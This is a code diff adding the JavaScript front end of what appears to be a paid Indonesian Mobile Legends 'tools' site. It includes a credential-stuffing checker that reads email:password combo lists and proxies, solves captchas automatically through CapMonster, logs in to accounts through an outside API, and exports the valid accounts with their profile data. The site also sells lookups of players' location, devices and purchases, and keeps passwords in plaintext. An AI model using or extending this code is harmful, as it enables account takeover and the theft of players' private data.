+            {id:'level',name:'LEVEL',icon:'fa-level-up',price:1500},
+            {id:'rank',name:'RANK',icon:'fa-trophy',price:1500},
+            {id:'hero_count',name:'HERO COUNT',icon:'fa-users',price:1500},
+            {id:'skin_count',name:'SKIN COUNT',icon:'fa-paint-roller',price:1500},
+            {id:'win_rate',name:'WIN RATE',icon:'fa-chart-line',price:1500},
+            {id:'matches',name:'MATCHES',icon:'fa-gamepad',price:1500},
+            {id:'mvp',name:'MVP',icon:'fa-star',price:1500},
+            {id:'savage',name:'SAVAGE',icon:'fa-skull',price:1500},
+            {id:'maniac',name:'MANIAC',icon:'fa-fire',price:1500},
+            {id:'legendary',name:'LEGENDARY',icon:'fa-crown',price:1500},
+            {id:'kda',name:'KDA',icon:'fa-calculator',price:1500},
+            {id:'team_participation',name:'TEAM FIGHT',icon:'fa-people-group',price:1500},
+            {id:'gold',name:'GOLD',icon:'fa-coins',price:1500},
+            {id:'damage',name:'DAMAGE',icon:'fa-bolt',price:1500},
+            {id:'taken',name:'DAMAGE TAKEN',icon:'fa-shield',price:1500},
+            {id:'most_kills',name:'MOST KILLS',icon:'fa-gun',price:1500},
+            {id:'most_assists',name:'MOST ASSISTS',icon:'fa-handshake',price:1500},
+            {id:'win_streak',name:'WIN STREAK',icon:'fa-arrow-trend-up',price:1500},
+            {id:'last_login',name:'LAST SEEN',icon:'fa-clock',price:1500},
+            {id:'squad',name:'SQUAD',icon:'fa-people-roof',price:1500},
+            {id:'country',name:'NEGARA',icon:'fa-flag',price:1500},
+            {id:'last_country',name:'LAST COUNTRY',icon:'fa-location-dot',price:1500},
+            {id:'locations',name:'LOKASI',icon:'fa-map',price:1500},
+            {id:'devices',name:'DEVICES',icon:'fa-mobile',price:1500},
+            {id:'supreme',name:'SUPREME',icon:'fa-gem',price:1500},
+            {id:'grand',name:'GRAND',icon:'fa-crown',price:1500},
+            {id:'exquisite',name:'EXQUISITE',icon:'fa-star',price:1500},
+            {id:'deluxe',name:'DELUXE',icon:'fa-crown',price:1500},
+            {id:'exceptional',name:'EXCEPTIONAL',icon:'fa-medal',price:1500},
+            {id:'common',name:'COMMON',icon:'fa-shirt',price:1500},
+            {id:'collector_level',name:'COLLECTOR',icon:'fa-layer-group',price:1500},
+            {id:'achievement',name:'ACHIEVEMENT',icon:'fa-medal',price:1500},
+            {id:'credit',name:'CREDIT',icon:'fa-credit-card',price:1500},
+            {id:'starlight',name:'STARLIGHT',icon:'fa-moon',price:1500},
+            {id:'v2l_status',name:'V2L STATUS',icon:'fa-shield-halved',price:1500},
+            {id:'top_heroes',name:'TOP HEROES',icon:'fa-ranking-star',price:1500},
+            {id:'last_match',name:'LAST MATCH',icon:'fa-clock-rotate-left',price:1500},
+            {id:'last_hero',name:'LAST HERO',icon:'fa-user',price:1500},
+            {id:'last_purchase',name:'LAST PURCHASE',icon:'fa-cart-shopping',price:1500},
+            {id:'double_kill',name:'DOUBLE KILL',icon:'fa-2',price:1500},
+            {id:'triple_kill',name:'TRIPLE KILL',icon:'fa-3',price:1500},
+            {id:'hack_location',name:'HACK LOKASI',icon:'fa-location-crosshairs',price:1500},
+            {id:'total_wins',name:'TOTAL WINS',icon:'fa-trophy',price:1500},
+            {id:'mvp_loss',name:'MVP LOSS',icon:'fa-face-frown',price:1500}
+        ];
+
+        let currentUser = null;
+        let currentFeature = null;
+        let v2lType = 'and';
+        let featureStatus = {};
+        let checkHistory = JSON.parse(localStorage.getItem('history') || '[]');
+        let selectedDeposit = 0;
+        let totalUsage = 0;
+
+        // Checker state
+        let checkerCombo = [];
+        let checkerProxy = [];
+        let captchaTokens = [];
+        let capmonsterClient = null;
+        let checkerStats = { valid:0, invalid:0, retry:0, gagal:0 };
+        let checkerResults = { valid:[], invalid:[], retry:[], gagal:[] };
+        let checkerActive = false;
+        let currentCaptchaMode = 'manual';
+        let selectedWebsiteFile = null;
+
+        // ==================== HELPER ====================
+        function showAlert(msg, type = 'info') {
+            const alert = document.getElementById('alert');
+            const msgSpan = document.getElementById('alertMessage');
+            if (!alert || !msgSpan) return;
+            alert.className = 'alert ' + type;
+            msgSpan.innerHTML = msg;
+            alert.classList.add('show');
+            setTimeout(() => alert.classList.remove('show'), 3000);
+        }
+
+        // ==================== FIREBASE ====================
+        async function firebaseRequest(method, path, data = null) {
+            try {
+                const url = `${FIREBASE_DB_URL}/${path}.json`;
+                const options = { 
+                    method, 
+                    headers: { 'Content-Type': 'application/json' },
+                    mode: 'cors'
+                };
+                if (data) options.body = JSON.stringify(data);
+                
+                const response = await fetch(url, options);
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return await response.json();
+            } catch(e) {
+                console.error('Firebase error:', e);
+                return null;
+            }
+        }
+
+        // ==================== LOADING ====================
+        function skipLoading() {
+            const loading = document.getElementById('loadingScreen');
+            if (loading) {
+                loading.classList.add('hide');
+                setTimeout(() => loading.style.display = 'none', 500);
+            }
+        }
+        setTimeout(skipLoading, 1500);
+
+        // ==================== LOGIN ====================
+        function switchLoginTab(tab) {
+            const tabLogin = document.getElementById('tabLogin');
+            const tabRegister = document.getElementById('tabRegister');
+            const loginForm = document.getElementById('loginForm');
+            const registerForm = document.getElementById('registerForm');
+            
+            if (tabLogin) tabLogin.classList.toggle('active', tab === 'login');
+            if (tabRegister) tabRegister.classList.toggle('active', tab === 'register');
+            if (loginForm) loginForm.classList.toggle('active', tab === 'login');
+            if (registerForm) registerForm.classList.toggle('active', tab === 'register');
+        }
+
+        async function handleRegister() {
+            const btn = document.getElementById('registerBtn');
+            const u = document.getElementById('registerUsername')?.value.trim() || '';
+            const p = document.getElementById('registerPassword')?.value.trim() || '';
+            const c = document.getElementById('registerConfirm')?.value.trim() || '';
+            
+            if (!u || !p || !c) return showAlert('Semua field harus diisi!', 'error');
+            if (p !== c) return showAlert('Password tidak cocok!', 'error');
+            if (u.length < 3) return showAlert('Username minimal 3 karakter!', 'error');
+            if (p.length < 4) return showAlert('Password minimal 4 karakter!', 'error');
+            
+            if (btn) {
+                btn.disabled = true;
+                btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> REGISTER...';
+            }
+            
+            try {
+                const exist = await firebaseRequest('GET', `users/${u}`);
+                if (exist) {
+                    showAlert('Username sudah digunakan!', 'error');
+                    if (btn) {
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fa-solid fa-user-plus"></i> REGISTER';
+                    }
+                    return;
+                }
+                
+                const newUser = {
+                    username: u, 
+                    password: p, 
+                    balance: 0, 
+                    isVIP: false, 
+                    isAdmin: false,
+                    isBlocked: false, 
+                    spamCount: 0, 
+                    lastSpamTime: null, 
+                    blockExpiry: null,
+                    createdAt: new Date().toISOString(),
+                    settings: { 
+                        webName: 'iBallFlyy', 
+                        featureStatus: {} 
+                    }
+                };
+                
+                FEATURES.forEach(f => newUser.settings.featureStatus[f.id] = true);
+                
+                const result = await firebaseRequest('PUT', `users/${u}`, newUser);
+                if (result) {
+                    showAlert('Registrasi berhasil! Silakan login.', 'success');
+                    switchLoginTab('login');
+                } else {
+                    showAlert('Gagal register! Coba lagi.', 'error');
+                }
+            } catch(e) {
+                showAlert('Error: ' + e.message, 'error');
+            } finally {
+                if (btn) {
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fa-solid fa-user-plus"></i> REGISTER';
+                }
+            }
+        }
+
+        async function handleLogin() {
+            const btn = document.getElementById('loginBtn');
+            const u = document.getElementById('loginUsername')?.value.trim() || '';
+            const p = document.getElementById('loginPassword')?.value.trim() || '';
+            
+            if (!u || !p) return showAlert('Username dan password harus diisi!', 'error');
+            
+            if (btn) {
+                btn.disabled = true;
+                btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> LOGIN...';
+            }
+            
+            try {
+                // Admin
+                if (u === ADMIN_USERNAME && p === ADMIN_PASSWORD) {
+                    currentUser = {
+                        username: ADMIN_USERNAME, 
+                        password: ADMIN_PASSWORD, 
+                        balance: 999999999,
+                        isVIP: true, 
+                        isAdmin: true, 
+                        isBlocked: false,
+                        vipExpiry: new Date(2099, 11, 31).toISOString(),
+                        settings: { 
+                            webName: 'iBallFlyy', 
+                            featureStatus: {} 
+                        }
+                    };
+                    FEATURES.forEach(f => currentUser.settings.featureStatus[f.id] = true);
+                    
+                    localStorage.setItem('currentUser', JSON.stringify(currentUser));
+                    loadUserSettings();
+                    
+                    const loginScreen = document.getElementById('loginScreen');
+                    if (loginScreen) loginScreen.classList.add('hide');
+                    
+                    setTimeout(() => {
+                        if (loginScreen) loginScreen.style.display = 'none';
+                        const main = document.getElementById('mainContainer');
+                        const toggle = document.getElementById('sidebarToggle');
+                        if (main) main.style.display = 'block';
+                        if (toggle) toggle.style.display = 'flex';
+                        updateUserInfo();
+                        generateMenuGrid();
+                        loadAdminDashboard();
+                        showAlert('Login admin berhasil!', 'success');
+                    }, 500);
+                    return;
+                }
+
+                // User biasa
+                const user = await firebaseRequest('GET', `users/${u}`);
+                if (!user) {
+                    showAlert('Username tidak ditemukan!', 'error');
+                    if (btn) {
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> LOGIN';
+                    }
+                    return;
+                }
+                
+                if (user.password !== p) {
+                    showAlert('Password salah!', 'error');
+                    if (btn) {
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> LOGIN';
+                    }
+                    return;
+                }
+                
+                // Cek block
+                if (user.isBlocked && user.blockExpiry) {
+                    const now = new Date();
+                    const blockExpiry = new Date(user.blockExpiry);
+                    if (now < blockExpiry) {
+                        const minutes = Math.ceil((blockExpiry - now) / 60000);
+                        showAlert(`Akun diblokir! Sisa: ${minutes} menit`, 'error');
+                        if (btn) {
+                            btn.disabled = false;
+                            btn.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> LOGIN';
+                        }
+                        return;
+                    } else {
+                        user.isBlocked = false;
+                        user.blockExpiry = null;
+                        user.spamCount = 0;
+                        await firebaseRequest('PUT', `users/${u}`, user);
+                    }
+                }
+
+                currentUser = user;
+                localStorage.setItem('currentUser', JSON.stringify(user));
+                loadUserSettings();
+                
+                const loginScreen = document.getElementById('loginScreen');
+                if (loginScreen) loginScreen.classList.add('hide');
+                
+                setTimeout(() => {
+                    if (loginScreen) loginScreen.style.display = 'none';
+                    const main = document.getElementById('mainContainer');
+                    const toggle = document.getElementById('sidebarToggle');
+                    if (main) main.style.display = 'block';
+                    if (toggle) toggle.style.display = 'flex';
+                    updateUserInfo();
+                    generateMenuGrid();
+                    showAlert('Login berhasil!', 'success');
+                }, 500);
+                
+            } catch(e) {
+                showAlert('Error: ' + e.message, 'error');
+                if (btn) {
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> LOGIN';
+                }
+            }
+        }
+
+        function logout() {
+            currentUser = null;
+            localStorage.removeItem('currentUser');
+            
+            const main = document.getElementById('mainContainer');
+            const toggle = document.getElementById('sidebarToggle');
+            const sidebar = document.getElementById('sidebar');
+            const overlay = document.getElementById('sidebarOverlay');
+            const login = document.getElementById('loginScreen');
+            const checker = document.getElementById('checkerPage');
+            const back = document.getElementById('backButton');
+            
+            if (main) main.style.display = 'none';
+            if (toggle) toggle.style.display = 'none';
+            if (sidebar) sidebar.classList.remove('open');
+            if (overlay) overlay.classList.remove('show');
+            if (login) {
+                login.style.display = 'flex';
+                login.classList.remove('hide');
+            }
+            if (checker) checker.classList.remove('active');
+            if (back) back.style.display = 'none';
+            
+            showAlert('Logout berhasil!', 'info');
+        }
+
+        function loadUserSettings() {
+            if (!currentUser?.settings) return;
+            featureStatus = currentUser.settings.featureStatus || {};
+            if (currentUser.settings.webName) {
+                const webTitle = document.getElementById('webTitle');
+                const webSubtitle = document.getElementById('webSubtitle');
+                const loadingLogo = document.getElementById('loadingLogo');
+                const loginWebName = document.getElementById('loginWebName');
+                const webNameInput = document.getElementById('webNameInput');
+                
+                if (webTitle) webTitle.innerHTML = `${currentUser.settings.webName} TOOLS`;
+                if (webSubtitle) webSubtitle.innerHTML = `TOOLS ${currentUser.settings.webName} MLBB`;
+                if (loadingLogo) loadingLogo.innerHTML = currentUser.settings.webName;
+                if (loginWebName) loginWebName.innerHTML = currentUser.settings.webName;
+                if (webNameInput) webNameInput.value = currentUser.settings.webName;
+            }
+        }
+
+        function updateUserInfo() {
+            if (!currentUser) return;
+            
+            const sidebarUsername = document.getElementById('sidebarUsername');
+            const sidebarBalance = document.getElementById('sidebarBalance');
+            const mainBalance = document.getElementById('mainBalance');
+            const sidebarRole = document.getElementById('sidebarRole');
+            const sidebarBadges = document.getElementById('sidebarBadges');
+            const mainBadges = document.getElementById('mainBadges');
+            
+            const bal = `Rp ${(currentUser.balance || 0).toLocaleString()}`;
+            
+            if (sidebarUsername) sidebarUsername.innerHTML = currentUser.username;
+            if (sidebarBalance) sidebarBalance.innerHTML = bal;
+            if (mainBalance) mainBalance.innerHTML = bal;
+            
+            const isVIP = currentUser.isVIP && currentUser.vipExpiry && new Date() < new Date(currentUser.vipExpiry);
+            const isBlocked = currentUser.isBlocked;
+            
+            let badges = '';
+            if (currentUser.isAdmin) {
+                if (sidebarRole) sidebarRole.innerHTML = 'ADMIN';
+                badges = '<span class="admin-badge"><i class="fa-solid fa-shield-halved"></i> ADMIN</span>';
+            } else if (isBlocked) {
+                if (sidebarRole) sidebarRole.innerHTML = 'BLOCKED';
+                badges = '<span class="blocked-badge"><i class="fa-solid fa-ban"></i> BLOCKED</span>';
+            } else if (isVIP) {
+                if (sidebarRole) sidebarRole.innerHTML = 'VIP MEMBER';
+                badges = '<span class="vip-badge-sidebar"><i class="fa-solid fa-crown"></i> VIP</span>';
+            } else {
+                if (sidebarRole) sidebarRole.innerHTML = 'MEMBER';
+            }
+            
+            if (sidebarBadges) sidebarBadges.innerHTML = badges;
+            if (mainBadges) mainBadges.innerHTML = badges;
+            
+            // Admin menu
+            if (currentUser.isAdmin) {
+                const menu = document.getElementById('sidebarMenu');
+                if (menu && !menu.innerHTML.includes('Admin Dashboard')) {
+                    menu.innerHTML = '<li><a href="#" onclick="showAdminDashboard();return false"><i class="fa-solid fa-chart-line"></i> Admin Dashboard</a></li>' + menu.innerHTML;
+                }
+            }
+        }
+
+        async function saveUserToFirebase() {
+            if (!currentUser || currentUser.isAdmin) return;
+            await firebaseRequest('PUT', `users/${currentUser.username}`, currentUser);
+        }
+
+        // ==================== GENERATE MENU ====================
+        function generateMenuGrid() {
+            const menuGrid = document.getElementById('menuGrid');
+            if (!menuGrid) return;
+            
+            let html = '';
+            FEATURES.forEach(f => {
+                const active = featureStatus[f.id] !== false;
+                html += `<div class="menu-card ${active ? '' : 'disabled-feature'}" onclick="selectFeature('${f.id}')" id="menu-${f.id}">
+                    <div class="menu-icon"><i class="fa-solid ${f.icon}"></i></div>
+                    <h3>${f.name}</h3>
+                    <span class="price-badge">Rp${f.price.toLocaleString()}</span>
+                </div>`;
+            });
+            menuGrid.innerHTML = html;
+        }
+
+        function selectFeature(f) {
+            if (!currentUser) return showAlert('Login dulu!', 'error');
+            if (currentUser.isBlocked) return showAlert('Akun diblokir karena spam!', 'error');
+            if (featureStatus[f] === false) return showAlert('Fitur ini dinonaktifkan admin!', 'error');
+            
+            currentFeature = f;
+            document.querySelectorAll('.menu-card').forEach(el => el.classList.remove('active'));
+            const menuCard = document.getElementById(`menu-${f}`);
+            if (menuCard) menuCard.classList.add('active');
+            
+            const feat = FEATURES.find(x => x.id === f);
+            const selectedFeature = document.getElementById('selected-feature');
+            if (selectedFeature) selectedFeature.innerHTML = feat ? feat.name : f.toUpperCase();
+            
+            const price = feat ? feat.price : 1500;
+            const priceInfo = document.getElementById('price-info');
+            if (priceInfo) {
+                priceInfo.innerHTML = (currentUser.isAdmin || (currentUser.isVIP && new Date() < new Date(currentUser.vipExpiry))) ?
+                    '<i class="fa-solid fa-crown" style="color:#ffaa00"></i><span class="price-text">VIP/ADMIN - GRATIS</span>' :
+                    `<i class="fa-solid fa-coins" style="color:#ffaa00"></i><span class="price-text">Harga: <span class="price-value">Rp${price.toLocaleString()}</span></span>`;
+            }
+            
+            const isFind = f === 'find' || f === 'ban_v3';
+            const isSpecial = f === 'ban_v2' || f === 'v2l' || isFind;
+            
+            const standard = document.getElementById('standard-input');
+            const banv2 = document.getElementById('banv2-input');
+            const v2l = document.getElementById('v2l-input');
+            const find = document.getElementById('find-input');
+            
+            if (standard) standard.style.display = isSpecial ? 'none' : 'block';
+            if (banv2) banv2.style.display = f === 'ban_v2' ? 'block' : 'none';
+            if (v2l) v2l.style.display = f === 'v2l' ? 'block' : 'none';
+            if (find) find.style.display = isFind ? 'block' : 'none';
+            
+            const inputSection = document.getElementById('inputSection');
+            if (inputSection) setTimeout(() => inputSection.scrollIntoView({ behavior: 'smooth' }), 100);
+        }
+
+        // ==================== CHECKER ====================
+        function showCheckerPage() {
+            const checker = document.getElementById('checkerPage');
+            const input = document.getElementById('inputSection');
+            const menu = document.getElementById('menuGrid');
+            const back = document.getElementById('backButton');
+            
+            if (checker) checker.classList.add('active');
+            if (input) input.style.display = 'none';
+            if (menu) menu.style.display = 'none';
+            if (back) back.style.display = 'flex';
+            toggleSidebar();
+        }
+
+        function hideCheckerPage() {
+            const checker = document.getElementById('checkerPage');
+            const input = document.getElementById('inputSection');
+            const menu = document.getElementById('menuGrid');
+            const back = document.getElementById('backButton');
+            
+            if (checker) checker.classList.remove('active');
+            if (input) input.style.display = 'block';
+            if (menu) menu.style.display = 'grid';
+            if (back) back.style.display = 'none';
+        }
+
+        function switchCheckerTab(t) {
+            document.querySelectorAll('#checkerPage .tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('#checkerPage .tab-content').forEach(c => c.classList.remove('active'));
+            if (event.currentTarget) event.currentTarget.classList.add('active');
+            const tab = document.getElementById(`checker-tab-${t}`);
+            if (tab) tab.classList.add('active');
+        }
+
+        function switchCaptchaMode(m) {
+            currentCaptchaMode = m;
+            document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.captcha-mode-content').forEach(c => c.classList.remove('active'));
+            const modeBtn = document.querySelector(`.mode-btn[onclick*="${m}"]`);
+            if (modeBtn) modeBtn.classList.add('active');
+            const modeContent = document.getElementById(`captcha-mode-${m}`);
+            if (modeContent) modeContent.classList.add('active');
+        }
+
+        function handleCheckerFile(i, t) {
+            const f = i.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = e => {
+                const lines = e.target.result.split('\n').filter(l => l.trim());
+                if (t === 'combo') {
+                    const comboPaste = document.getElementById('checker-combo-paste');
+                    const comboInfo = document.getElementById('checker-combo-info');
+                    const comboName = document.getElementById('checker-combo-name');
+                    
+                    if (comboPaste) comboPaste.value = e.target.result;
+                    checkerCombo = lines.filter(l => l.includes(':'));
+                    if (comboInfo) {
+                        comboInfo.innerHTML = `<i class="fa-solid fa-check-circle"></i> ${f.name} (${checkerCombo.length} accounts) <i class="fa-solid fa-times remove-file" onclick="removeCheckerFile('combo')"></i>`;
+                        comboInfo.classList.add('show');
+                    }
+                    addCheckerLog(`📁 Loaded ${checkerCombo.length} accounts from ${f.name}`);
+                } else if (t === 'proxy') {
+                    const proxyPaste = document.getElementById('checker-proxy-paste');
+                    const proxyInfo = document.getElementById('checker-proxy-info');
+                    
+                    if (proxyPaste) proxyPaste.value = e.target.result;
+                    checkerProxy = lines;
+                    if (proxyInfo) {
+                        proxyInfo.innerHTML = `<i class="fa-solid fa-check-circle"></i> ${f.name} (${checkerProxy.length} proxies) <i class="fa-solid fa-times remove-file" onclick="removeCheckerFile('proxy')"></i>`;
+                        proxyInfo.classList.add('show');
+                    }
+                    addCheckerLog(`🌐 Loaded ${checkerProxy.length} proxies from ${f.name}`);
+                }
+            };
+            r.readAsText(f);
+        }
+
+        function handleCaptchaFile(i) {
+            const f = i.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = e => {
+                const lines = e.target.result.split('\n').filter(l => l.trim());
+                captchaTokens = lines;
+                const captchaPaste = document.getElementById('captcha-paste');
+                const tokenCount = document.getElementById('token-count');
+                const captchaLog = document.getElementById('captcha-log');
+                
+                if (captchaPaste) captchaPaste.value = e.target.result;
+                if (tokenCount) tokenCount.innerHTML = captchaTokens.length;
+                if (captchaLog) captchaLog.value = captchaTokens.join('\n');
+                addCheckerLog(`🔑 Loaded ${captchaTokens.length} captcha tokens`);
+            };
+            r.readAsText(f);
+        }
+
+        function removeCheckerFile(t) {
+            if (t === 'combo') {
+                const comboPaste = document.getElementById('checker-combo-paste');
+                const comboFile = document.getElementById('checker-combo-file');
+                const comboInfo = document.getElementById('checker-combo-info');
+                
+                if (comboPaste) comboPaste.value = '';
+                if (comboFile) comboFile.value = '';
+                if (comboInfo) comboInfo.classList.remove('show');
+                checkerCombo = [];
+            } else {
+                const proxyPaste = document.getElementById('checker-proxy-paste');
+                const proxyFile = document.getElementById('checker-proxy-file');
+                const proxyInfo = document.getElementById('checker-proxy-info');
+                
+                if (proxyPaste) proxyPaste.value = '';
+                if (proxyFile) proxyFile.value = '';
+                if (proxyInfo) proxyInfo.classList.remove('show');
+                checkerProxy = [];
+            }
+        }
+
+        // Captcha
+        window.addEventListener('message', function(e) {
+            if (e.data.type === 'captcha' && e.data.token) {
+                captchaTokens.push(e.data.token);
+                const captchaPaste = document.getElementById('captcha-paste');
+                const tokenCount = document.getElementById('token-count');
+                const captchaLog = document.getElementById('captcha-log');
+                
+                if (captchaPaste) captchaPaste.value = captchaTokens.join('\n');
+                if (tokenCount) tokenCount.innerHTML = captchaTokens.length;
+                if (captchaLog) captchaLog.value = captchaTokens.join('\n');
+                addCheckerLog(`✅ Captcha token received from ${e.data.id}`);
+                
+                try {
+                    const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-jump-coin-216.wav');
+                    audio.volume = 0.3;
+                    audio.play();
+                } catch(e) { }
+            }
+        });
+
+        function initCapMonster() {
+            const key = document.getElementById('capmonster-api-key')?.value.trim() || '';
+            if (!key) return false;
+            capmonsterClient = CapMonsterCloudClientFactory.Create(new ClientOptions({ clientKey: key }));
+            return true;
+        }
+
+        async function checkCapMonsterBalance() {
+            const key = document.getElementById('capmonster-api-key')?.value.trim() || '';
+            if (!key) return addCheckerLog('❌ Masukkan API Key', 'gagal');
+            const client = CapMonsterCloudClientFactory.Create(new ClientOptions({ clientKey: key }));
+            try {
+                const bal = await client.getBalance();
+                const balanceSpan = document.getElementById('capmonster-balance');
+                if (balanceSpan) balanceSpan.innerHTML = `$${bal.toFixed(2)}`;
+                addCheckerLog(`💰 CapMonster Balance: $${bal.toFixed(2)}`, 'valid');
+            } catch(e) {
+                addCheckerLog(`❌ Balance error: ${e.message}`, 'gagal');
+            }
+        }
+
+        async function solveCaptcha(proxy) {
+            if (!capmonsterClient && !initCapMonster()) return null;
+            try {
+                const url = document.getElementById('capmonster-website')?.value || 'https://account.mobilelegends.com';
+                let req;
+                if (proxy) {
+                    let pc = null;
+                    if (proxy.includes('@')) {
+                        const [a, h] = proxy.split('@');
+                        const [u, pw] = a.split(':');
+                        const [ip, pt] = h.split(':');
+                        pc = {
+                            proxyType: 'http',
+                            proxyAddress: ip,
+                            proxyPort: parseInt(pt),
+                            proxyLogin: u,
+                            proxyPassword: pw
+                        };
+                    } else {
+                        const [ip, pt] = proxy.split(':');
+                        pc = {
+                            proxyType: 'http',
+                            proxyAddress: ip,
+                            proxyPort: parseInt(pt)
+                        };
+                    }
+                    req = new YidunRequest({
+                        websiteURL: url,
+                        websiteKey: 'fef5c67c39074e9d845f4bf579cc07af',
+                        userAgent: 'Mozilla/5.0',
+                        proxy: pc
+                    });
+                } else {
+                    req = new YidunRequest({
+                        websiteURL: url,
+                        websiteKey: 'fef5c67c39074e9d845f4bf579cc07af',
+                        userAgent: 'Mozilla/5.0'
+                    });
+                }
+                addCheckerLog('🤖 Solving captcha with CapMonster...', 'info');
+                const res = await capmonsterClient.Solve(req);
+                if (res?.solution) {
+                    addCheckerLog('✅ Captcha solved successfully', 'valid');
+                    return res.solution;
+                }
+                return null;
+            } catch(e) {
+                addCheckerLog(`❌ CapMonster error: ${e.message}`, 'gagal');
+                return null;
+            }
+        }
+
+        function addCheckerLog(m, t = 'info') {
+            const log = document.getElementById('checker-log');
+            if (!log) return;
+            const e = document.createElement('div');
+            e.className = `log-entry ${t}`;
+            const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
+            e.innerText = `[${time}] ${m}`;
+            log.appendChild(e);
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function clearCheckerLog() {
+            const log = document.getElementById('checker-log');
+            if (log) log.innerHTML = '';
+            addCheckerLog('Log cleared');
+        }
+
+        function copyCheckerLog() {
+            const log = document.getElementById('checker-log');
+            if (!log) return;
+            navigator.clipboard.writeText(log.innerText);
+            addCheckerLog('📋 Log copied to clipboard');
+        }
+
+        function updateCheckerStats() {
+            const valid = document.getElementById('checker-valid');
+            const invalid = document.getElementById('checker-invalid');
+            const retry = document.getElementById('checker-retry');
+            const gagal = document.getElementById('checker-gagal');
+            const downloadValid = document.getElementById('checker-download-valid');
+            const downloadInvalid = document.getElementById('checker-download-invalid');
+            
+            if (valid) valid.innerText = checkerStats.valid;
+            if (invalid) invalid.innerText = checkerStats.invalid;
+            if (retry) retry.innerText = checkerStats.retry;
+            if (gagal) gagal.innerText = checkerStats.gagal;
+            if (downloadValid) downloadValid.disabled = checkerResults.valid.length === 0;
+            if (downloadInvalid) downloadInvalid.disabled = checkerResults.invalid.length === 0;
+        }
+
+        function formatCheckerAccount(acc) {
+            let r = `${acc.email}:${acc.password}\n`;
+            if (acc.role_info?.length) {
+                const ri = acc.role_info[0];
+                r += `ID: ${ri.role_id || 'N/A'} (${ri.zone_id || 'N/A'})\n`;
+            }
+            if (acc.lookup_info?.length) {
+                const li = acc.lookup_info[0].data;
+                if (li) {
+                    r += `Name: ${li.name || 'N/A'}\nLevel: ${li.level || 0}\n`;
+                    r += `Tier: ${li.current_tier || 'N/A'}\n`;
+                    r += `Hero: ${li.hero_count || 0} | Skin: ${li.skin_count || 0}\n`;
+                }
+            }
+            r += `GUID: ${acc.guid || 'N/A'}\n------------------------\n`;
+            return r;
+        }
+
+        function downloadCheckerFile(t) {
+            let c = '';
+            if (t === 'valid') c = checkerResults.valid.map(a => formatCheckerAccount(a)).join('\n');
+            else c = checkerResults.invalid.join('\n');
+            const b = new Blob([c], { type: 'text/plain' });
+            const u = URL.createObjectURL(b);
+            const a = document.createElement('a');
+            a.href = u;
+            a.download = `${t}_accounts_${Date.now()}.txt`;
+            a.click();
+            URL.revokeObjectURL(u);
+            addCheckerLog(`📥 Downloaded ${t} accounts (${c.split('\n').length} lines)`);
+        }
+
+        async function processCheckerAccount(email, pass, proxy, captcha) {
+            const acc = { email, password: pass, valid: false, guid: null, role_info: [], lookup_info: [] };
+            try {
+                addCheckerLog(`🔑 Checking: ${email}`);
+                
+                const login = await fetch(CHECKER_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                    body: JSON.stringify({ login: email, password: pass, proxy, captcha_cn31: captcha, type: 'login' })
+                });
+                const ld = await login.json();
+                if (ld.status !== 0) throw new Error(ld.message || 'Login failed');
+                
+                acc.guid = ld.data.guid;
+                acc.session = ld.data.session;
+                
+                const v2l = await fetch(V2L_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                    body: JSON.stringify({ guid: acc.guid, session: acc.session, type: 'and' })
+                });
+                const vd = await v2l.json();
+                if (vd.status === 0 && vd.data) {
+                    if (vd.data.role_id && vd.data.zone_id) {
+                        acc.role_info.push({ role_id: vd.data.role_id, zone_id: vd.data.zone_id });
+                        
+                        const look = await fetch(LOOKUP_BIND_API, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                            body: JSON.stringify({ role_id: vd.data.role_id, zone_id: vd.data.zone_id, type: 'lookup' })
+                        });
+                        const lk = await look.json();
+                        if (lk.status === 0) acc.lookup_info.push({ data: lk.data });
+                    }
+                }
+                
+                acc.valid = true;
+                addCheckerLog(`✅ VALID: ${email}`, 'valid');
+                const preview = document.getElementById('checker-preview');
+                if (preview) preview.innerHTML = `<pre>${formatCheckerAccount(acc).substring(0, 300)}...</pre>`;
+                return { status: 'valid', account: acc };
+                
+            } catch(e) {
+                addCheckerLog(`❌ INVALID: ${email} - ${e.message}`, 'invalid');
+                return { status: 'invalid', account: `${email}:${pass}` };
+            }
+        }
+
+        async function startChecker() {
+            if (checkerActive) return;
+            if (!currentUser) return showAlert('Login dulu!', 'error');
+            if (currentUser.isBlocked) return showAlert('Akun diblokir!', 'error');
+            
+            const combo = document.getElementById('checker-combo-paste')?.value.trim() || '';
+            const proxy = document.getElementById('checker-proxy-paste')?.value.trim() || '';
+            checkerCombo = combo.split('\n').filter(l => l.includes(':'));
+            checkerProxy = proxy.split('\n').filter(l => l.trim());
+            
+            if (checkerCombo.length > MAX_ACCOUNTS) return showAlert(`Max ${MAX_ACCOUNTS} akun!`, 'error');
+            if (!checkerCombo.length) return showAlert('Masukkan combo list!', 'error');
+            if (!checkerProxy.length) return showAlert('Masukkan proxy list!', 'error');
+            
+            // Cek saldo
+            if (!currentUser.isAdmin && !currentUser.isVIP) {
+                if ((currentUser.balance || 0) < CHECKER_PRICE) {
+                    return showAlert(`Saldo tidak cukup! Harga: Rp${CHECKER_PRICE.toLocaleString()}`, 'error');
+                }
+            }
+            
+            // Reset
+            checkerStats = { valid: 0, invalid: 0, retry: 0, gagal: 0 };
+            checkerResults = { valid: [], invalid: [], retry: [], gagal: [] };
